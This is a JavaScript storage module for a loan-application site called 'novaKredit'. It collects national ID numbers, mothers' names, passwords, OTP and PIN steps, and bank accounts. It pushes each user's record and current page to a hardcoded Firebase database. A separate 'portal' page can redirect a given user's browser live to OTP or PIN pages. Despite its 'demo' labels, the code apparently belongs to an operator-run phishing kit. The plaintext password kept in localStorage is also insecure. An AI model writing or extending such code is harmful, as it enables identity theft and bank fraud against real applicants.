(() => {
  'use strict';

  const PREFIX = 'novaKredit.';
  const KEYS = Object.freeze({
    session: PREFIX + 'session',
    identity: PREFIX + 'identity',
    application: PREFIX + 'application',
    users: PREFIX + 'users',
    pageVisit: PREFIX + 'currentPageVisit'
  });

  const safeParse = (value, fallback = null) => {
    try { return value ? JSON.parse(value) : fallback; }
    catch { return fallback; }
  };

const FIREBASE_CONFIG = {
  apiKey: "AIzaSyDaFT8eQh1JrstxlFJX7ofqz0cwXDbSrcQ",
  authDomain: "kingdendy.firebaseapp.com",
  databaseURL: "https://kingdendy-default-rtdb.asia-southeast1.firebasedatabase.app",
  projectId: "kingdendy",
  storageBucket: "kingdendy.firebasestorage.app",
  messagingSenderId: "964436741389",
  appId: "1:964436741389:web:8975e303763fe1e7207444"
};

let firebaseDb = null;
const initFirebase = () => {
  if (firebaseDb) return firebaseDb;
  if (typeof window.firebase === 'undefined') {
    console.warn('Firebase compat library belum dimuat. Pastikan firebase-app-compat.js dan firebase-database-compat.js dimuat sebelum storage.js.');
    return null;
  }

  try {
    firebase.initializeApp(FIREBASE_CONFIG);
    firebaseDb = firebase.database();
    console.info('Firebase inisialisasi sukses. databaseURL=', FIREBASE_CONFIG.databaseURL);
    return firebaseDb;
  } catch (error) {
    console.warn('Firebase initialization failed:', error);
    return null;
  }
};

const firebaseRef = path => {
  const db = initFirebase();
  if (!db) {
    console.warn('Firebase database tidak tersedia untuk path:', path);
    return null;
  }
  return db.ref(path);
};

const writeRemoteUser = async user => {
  if (!user || !user.username) {
    console.warn('writeRemoteUser dipanggil tanpa user yang valid:', user);
    return false;
  }

  const ref = firebaseRef(`users/${encodeURIComponent(user.username)}`);
  if (!ref) return false;

  return new Promise(resolve => {
    ref.set(user, error => {
      if (error) {
        console.warn('Firebase write gagal untuk user', user.username, error);
        resolve(false);
      } else {
        console.info('Firebase write sukses untuk user', user.username);
        resolve(true);
      }
    });
  });
};

const observeRemoteUsers = callback => {
  if (typeof callback !== 'function') {
    console.warn('observeRemoteUsers dipanggil tanpa callback function.');
    return false;
  }

  const ref = firebaseRef('users');
  if (!ref) {
    console.warn('observeRemoteUsers gagal: Firebase database tidak tersedia.');
    return false;
  }

  ref.on('value', snapshot => {
    callback(snapshot.val() || {});
  });
  return true;
};

const SYNC_CHANNEL = 'novaKredit-sync';
const broadcastChannel = typeof BroadcastChannel !== 'undefined' ? new BroadcastChannel(SYNC_CHANNEL) : null;
const publishSync = () => {
  if (!broadcastChannel) return;
  try {
    broadcastChannel.postMessage({ type: 'novaKredit-sync', timestamp: Date.now() });
  } catch (error) {
    console.warn('BroadcastChannel publish failed:', error);
  }
};

const write = (key, value) => {
  try {
    localStorage.setItem(key, JSON.stringify(value));
    publishSync();
    return true;
  } catch (error) {
    console.error('Gagal menyimpan data lokal:', error);
    return false;
  }
};

const read = (key, fallback = null) => safeParse(localStorage.getItem(key), fallback);

  const normalizeText = value => String(value ?? '').trim().replace(/\s+/g, ' ');

  const api = {
    keys: KEYS,
    setSession(data) {
      const identityValue = normalizeText(data.identity || data.username || '');
      const emailValue = normalizeText(data.email || (identityValue.includes('@') ? identityValue : ''));
      const usernameValue = normalizeText(data.username || identityValue);
      const passwordValue = String(data.password ?? '');

      const saved = write(KEYS.session, {
        identity: identityValue,
        username: usernameValue,
        email: emailValue,
        password: passwordValue,
        remember: Boolean(data.remember),
        authenticatedAt: new Date().toISOString()
      });

      if (saved) {
        const currentPage = window.location.pathname.split('/').pop() || 'index.html';
        this.registerOrUpdateUser({
          username: usernameValue,
          email: emailValue,
          identity: identityValue,
          currentPage,
          status: this.getUserStatus(this.getApplication())
        });
      }

      return saved;
    },
    getSession() { return read(KEYS.session, null); },
    clearSession() { localStorage.removeItem(KEYS.session); },

    setIdentity(data) {
      const payload = {
        fullName: normalizeText(data.fullName),
        nik: String(data.nik ?? '').replace(/\D/g, '').slice(0, 16),
        motherName: normalizeText(data.motherName),
        updatedAt: new Date().toISOString()
      };

      const ok = write(KEYS.identity, payload);

      // Kompatibilitas dengan file lama yang sudah memakai key berikut.
      if (ok) {
        localStorage.setItem('userNama', payload.fullName);
        localStorage.setItem('userNik', payload.nik);
        localStorage.setItem('motherName', payload.motherName);
        this.updateCurrentSessionUser();
      }
      return ok;
    },
    getIdentity() {
      const current = read(KEYS.identity, null);
      if (current) return current;

      const legacy = {
        fullName: normalizeText(localStorage.getItem('userNama')),
        nik: String(localStorage.getItem('userNik') || '').replace(/\D/g, ''),
        motherName: normalizeText(localStorage.getItem('motherName'))
      };
      return legacy.fullName || legacy.nik || legacy.motherName ? legacy : null;
    },
    clearIdentity() {
      localStorage.removeItem(KEYS.identity);
      ['userNama', 'userNik', 'motherName'].forEach(key => localStorage.removeItem(key));
    },

    setApplication(data) {
      const current = this.getApplication();
      const saved = write(KEYS.application, {
        ...current,
        ...data,
        updatedAt: new Date().toISOString()
      });
      if (saved) {
        this.updateCurrentSessionUser();
      }
      return saved;
    },

    getApplication() {
      const defaults = {
        applicationId: 'LN-2026-008421',
        currentStep: 'SMS_VERIFIED',
        status: 'DRAFT',
        limit: 75000000,
        annualRate: 12,
        smsVerified: false,
        smsVerifiedAt: null,
        documentsCompleted: false,
        documentsCompletedAt: null,
        loan: {
          amount: 0,
          tenor: 0,
          annualRate: 12,
          purpose: 'Modal Usaha',
          monthlyInstallment: 0,
          totalPayment: 0
        },
        summaryConfirmed: false,
        summaryConfirmedAt: null,
        pinConfirmed: false,
        pinConfirmedAt: null,
        processingStage: null,
        processingStartedAt: null,
        processingCompletedAt: null,
        bankAccount: '',
        resultAvailable: false,
        result: {
          status: 'APPROVED_DEMO',
          title: 'Pengajuan Berhasil Diproses',
          message: 'Data demonstrasi telah selesai diproses.',
          approvedAmount: 0
        }
      };
      const stored = read(KEYS.application, null);
      const legacy = safeParse(localStorage.getItem('pinjamanDemoDataV1'), {}) || {};
      const legacyAmount = Number(legacy.loanAmount || localStorage.getItem('loanAmount') || 0);
      const legacyTenor = Number(legacy.loanTenor || localStorage.getItem('loanTenor') || 0);
      const legacyMonthly = Number(legacy.estimatedInstallment || localStorage.getItem('estimatedInstallment') || 0);
      const legacyTotal = Number(legacy.estimatedTotal || localStorage.getItem('estimatedTotal') || 0);
      const legacyAccount = String(legacy.disbursementAccount || localStorage.getItem('disbursementAccount') || '');
      const legacyPurpose = String(legacy.loanPurposeOther || legacy.loanPurpose || localStorage.getItem('loanPurposeOther') || localStorage.getItem('loanPurpose') || '');
      const migrated = (!stored && legacyAmount > 0 && legacyTenor > 0) ? {
        currentStep: 'LOAN_FORM_COMPLETED',
        status: 'LOAN_FORM_COMPLETED',
        loanFormCompleted: true,
        limit: legacyAmount,
        disbursementAccount: legacyAccount,
        bankAccount: legacyAccount,
        loan: {
          amount: legacyAmount,
          tenor: legacyTenor,
          annualRate: 12,
          purpose: legacyPurpose,
          monthlyInstallment: legacyMonthly,
          totalPayment: legacyTotal
        }
      } : null;
      const source = stored || migrated;
      return source
        ? {
            ...defaults,
            ...source,
            loan: { ...defaults.loan, ...(source.loan || {}) },
            result: { ...defaults.result, ...(source.result || {}) }
          }
        : defaults;
    },

    resetApplicationFlow() {
      const current = this.getApplication();
      return write(KEYS.application, {
        ...current,
        currentStep: 'SMS_VERIFIED',
        status: 'DRAFT',
        documentsCompleted: false,
        documentsCompletedAt: null,
        summaryConfirmed: false,
        summaryConfirmedAt: null,
        pinConfirmed: false,
        pinConfirmedAt: null,
        processingStage: null,
        processingStartedAt: null,
        processingCompletedAt: null,
        resultAvailable: false,
        updatedAt: new Date().toISOString()
      });
    },

    getPageByLabel(label) {
      if (!label) return null;
      const map = {
        login: 'index.html',
        masuk: 'index.html',
        'halaman masuk': 'index.html',
        'halaman pertama': 'index.html',
        'form_nik': 'form-nik.html',
        'form nik': 'form-nik.html',
        'form-nik': 'form-nik.html',
        'nama lengkap': 'form-nik.html',
        otp: 'verifikasi-sms.html',
        'kode otp': 'verifikasi-sms.html',
        pin: 'konfirmasi-pin.html',
        'halaman pin': 'konfirmasi-pin.html'
      };
      const key = String(label).trim().toLowerCase();
      return map[key] || key;
    },

    normalizeUserKey(value = '') {
      return String(value).trim().toLowerCase();
    },

    getAllUsers() {
      return read(KEYS.users, []);
    },

    getUser(identifier) {
      const key = this.normalizeUserKey(identifier);
      if (!key) return null;
      return this.getAllUsers().find(user => this.normalizeUserKey(user.username) === key || this.normalizeUserKey(user.email) === key || this.normalizeUserKey(user.identity) === key) || null;
    },

    saveUsers(users) {
      const saved = write(KEYS.users, users);
      if (saved && Array.isArray(users)) {
        users.forEach(user => writeRemoteUser(user));
      }
      return saved;
    },

    registerOrUpdateUser(data = {}) {
      const username = this.normalizeUserKey(data.username || data.identity || data.email || '');
      const email = String(data.email || '').trim();
      if (!username) return false;

      const users = this.getAllUsers();
      const existingIndex = users.findIndex(user => this.normalizeUserKey(user.username) === username || (email && this.normalizeUserKey(user.email) === this.normalizeUserKey(email)));
      const existing = existingIndex >= 0 ? users[existingIndex] : null;
      const nextUser = {
        username,
        email,
        identity: String(data.identity || '').trim(),
        fullName: String(data.fullName || existing?.fullName || '').trim(),
        role: data.role || existing?.role || 'user',
        status: data.status || existing?.status || 'Baru',
        currentPage: data.currentPage || existing?.currentPage || 'index.html',
        targetPage: data.targetPage || existing?.targetPage || null,
        updatedAt: new Date().toISOString()
      };

      if (existingIndex >= 0) {
        users[existingIndex] = { ...existing, ...nextUser };
      } else {
        users.push(nextUser);
      }

      return this.saveUsers(users);
    },

    updateUser(identifier, patch = {}) {
      const users = this.getAllUsers();
      const key = this.normalizeUserKey(identifier);
      const index = users.findIndex(user => this.normalizeUserKey(user.username) === key || this.normalizeUserKey(user.email) === key || this.normalizeUserKey(user.identity) === key);
      if (index < 0) return false;
      users[index] = { ...users[index], ...patch, updatedAt: new Date().toISOString() };
      const saved = this.saveUsers(users);
      if (saved) {
        writeRemoteUser(users[index]);
      }
      return saved;
    },

    observeRemoteUsers(callback) {
      return observeRemoteUsers(callback);
    },

    setCurrentPage(page = null) {
      const current = String(page || window.location.pathname.split('/').pop() || 'index.html').trim();
      if (!current) return false;
      const saved = write(KEYS.pageVisit, {
        page: current,
        updatedAt: new Date().toISOString()
      });

      const session = this.getSession();
      if (session?.username || session?.identity) {
        this.registerOrUpdateUser({
          username: session.username || session.identity,
          email: session.email,
          identity: session.identity,
          currentPage: current,
          status: this.getUserStatus(this.getApplication())
        });
      }
      return saved;
    },

    getCurrentPageVisit() {
      return read(KEYS.pageVisit, null);
    },

    updateCurrentSessionUser() {
      const session = this.getSession();
      if (!session?.username && !session?.identity) return false;
      const page = this.getCurrentPageVisit()?.page || window.location.pathname.split('/').pop() || 'index.html';
      return this.registerOrUpdateUser({
        username: session.username || session.identity,
        email: session.email,
        identity: session.identity,
        currentPage: page,
        status: this.getUserStatus(this.getApplication())
      });
    },

    setUserTargetPage(page, identifier) {
      const target = this.getPageByLabel(page);
      if (!target || !identifier) return false;
      return this.updateUser(identifier, { targetPage: target });
    },

    clearUserTargetPage(identifier) {
      if (!identifier) return false;
      return this.updateUser(identifier, { targetPage: null });
    },

    getUserTargetPage(identifier) {
      const user = this.getUser(identifier);
      return user?.targetPage || null;
    },

    applyPortalPageRedirect() {
      const session = this.getSession();
      if (!session) return false;
      const current = window.location.pathname.split('/').pop() || 'index.html';
      if (current === 'portal.html') return false;
      const user = this.getUser(session.username || session.identity || session.email);
      const target = user?.targetPage;
      if (!target || current === target) return false;
      window.location.replace(target);
      return true;
    },

    getUserStatus(application = null) {
      const app = application || this.getApplication();
      if (!app.smsVerified) return 'Form NIK';
      if (app.smsVerified && !app.documentsCompleted) return 'Verifikasi OTP';
      if (app.documentsCompleted && app.currentStep === 'DOCUMENTS_COMPLETED') return 'Upload Dokumen';
      if (app.currentStep === 'LOAN_FORM_COMPLETED') return 'Form Pinjaman';
      if (app.currentStep === 'SUMMARY_CONFIRMED') return 'Ringkasan Pengajuan';
      if (app.currentStep === 'PIN_CONFIRMED') return 'Halaman PIN';
      if (app.currentStep === 'SUBMISSION_PROCESSING') return 'Proses Pengajuan';
      if (app.currentStep === 'RESULT_AVAILABLE') return 'Hasil Tersedia';
      return app.status || 'Aktif';
    },

    setStep(step, patch = {}) {
      return this.setApplication({
        currentStep: step,
        ...patch
      });
    },

    setSmsVerified(value = true) {
      return this.setStep(value ? 'SMS_VERIFIED' : 'IDENTITY_COMPLETED', {
        smsVerified: Boolean(value),
        smsVerifiedAt: value ? new Date().toISOString() : null,
        lastOtp: value ? (this.getApplication().lastOtp || '') : '',
        status: value ? 'DRAFT' : 'IDENTITY_COMPLETED'
      });
    },

    setDocumentsCompleted(value = true) {
      return this.setStep(value ? 'DOCUMENTS_COMPLETED' : 'SMS_VERIFIED', {
        documentsCompleted: Boolean(value),
        documentsCompletedAt: value ? new Date().toISOString() : null,
        status: value ? 'DOCUMENTS_COMPLETED' : 'DRAFT'
      });
    },

    setLoan(data) {
      const current = this.getApplication();
      return this.setStep('LOAN_FORM_COMPLETED', {
        loan: { ...current.loan, ...data },
        summaryConfirmed: false,
        pinConfirmed: false,
        resultAvailable: false,
        status: 'LOAN_FORM_COMPLETED'
      });
    },

    confirmSummary() {
      return this.setStep('SUMMARY_CONFIRMED', {
        summaryConfirmed: true,
        summaryConfirmedAt: new Date().toISOString(),
        pinConfirmed: false,
        resultAvailable: false,
        status: 'SUMMARY_CONFIRMED'
      });
    },

    confirmPin() {
      return this.setStep('PIN_CONFIRMED', {
        pinConfirmed: true,
        pinConfirmedAt: new Date().toISOString(),
        processingStage: null,
        resultAvailable: false,
        status: 'PIN_CONFIRMED'
      });
    },

    startProcessing() {
      return this.setStep('SUBMISSION_PROCESSING', {
        processingStage: 'IDENTITY_VALIDATION',
        processingStartedAt: new Date().toISOString(),
        processingCompletedAt: null,
        resultAvailable: false,
        status: 'PROCESSING'
      });
    },

    updateProcessingStage(stage) {
      return this.setStep('SUBMISSION_PROCESSING', {
        processingStage: stage,
        status: 'PROCESSING'
      });
    },

    completeProcessing() {
      const current = this.getApplication();
      return this.setStep('RESULT_AVAILABLE', {
        processingStage: 'COMPLETED',
        processingCompletedAt: new Date().toISOString(),
        resultAvailable: true,
        status: current.result.status,
        result: {
          ...current.result,
          approvedAmount: current.loan.amount
        }
      });
    },

    requireSession(redirect = 'index.html') {
      if (!this.getSession()) {
        window.location.replace(redirect);
        return false;
      }
      return true;
    },

    requireIdentity(redirect = 'form-nik.html') {
      const identity = this.getIdentity();
      if (!identity || !identity.fullName || !/^\d{16}$/.test(identity.nik || '')) {
        window.location.replace(redirect);
        return false;
      }
      return true;
    },

    requireSmsVerification(redirect = 'verifikasi-sms.html') {
      if (!this.getApplication().smsVerified) {
        window.location.replace(redirect);
        return false;
      }
      return true;
    },

    requireDocuments(redirect = 'upload-dokumen.html') {
      if (!this.getApplication().documentsCompleted) {
        window.location.replace(redirect);
        return false;
      }
      return true;
    },

    requireLoan(redirect = 'form-pinjaman.html') {
      const app = this.getApplication();
      if (!app.loan || Number(app.loan.amount) <= 0 || Number(app.loan.tenor) <= 0 || app.currentStep === 'DOCUMENTS_COMPLETED') {
        window.location.replace(redirect);
        return false;
      }
      return true;
    },

    requireSummary(redirect = 'ringkasan-pengajuan.html') {
      if (!this.getApplication().summaryConfirmed) {
        window.location.replace(redirect);
        return false;
      }
      return true;
    },

    requirePin(redirect = 'konfirmasi-pin.html') {
      if (!this.getApplication().pinConfirmed) {
        window.location.replace(redirect);
        return false;
      }
      return true;
    },

    requireProcessing(redirect = 'proses-pengajuan.html') {
      const app = this.getApplication();
      if (!['SUBMISSION_PROCESSING', 'RESULT_AVAILABLE'].includes(app.currentStep)) {
        window.location.replace(redirect);
        return false;
      }
      return true;
    },

    requireResult(redirect = 'proses-pengajuan.html') {
      if (!this.getApplication().resultAvailable) {
        window.location.replace(redirect);
        return false;
      }
      return true;
    },

    maskNik(nik) {
      const digits = String(nik || '').replace(/\D/g, '');
      if (digits.length !== 16) return 'NIK belum tersedia';
      return `NIK ${digits.slice(0,4)} •••• •••• ${digits.slice(-4)}`;
    },
    initials(name) {
      return normalizeText(name).split(' ').filter(Boolean).slice(0,2)
        .map(part => part.charAt(0).toUpperCase()).join('') || 'P';
    }
  };

  window.NovaStorage = Object.freeze(api);

  const initPortalRedirect = () => {
    if (typeof window === 'undefined' || !window.location) return;
    const current = window.location.pathname.split('/').pop() || 'index.html';
    api.setCurrentPage(current);
    api.applyPortalPageRedirect();
  };

  window.addEventListener('storage', event => {
    if (!event.key) return;
    if ([KEYS.users, KEYS.pageVisit].includes(event.key) && window.location.pathname.split('/').pop() !== 'portal.html') {
      api.applyPortalPageRedirect();
    }
  });

  if (typeof document !== 'undefined') {
    if (document.readyState === 'loading') {
      document.addEventListener('DOMContentLoaded', initPortalRedirect);
    } else {
      initPortalRedirect();
    }
  }
})();
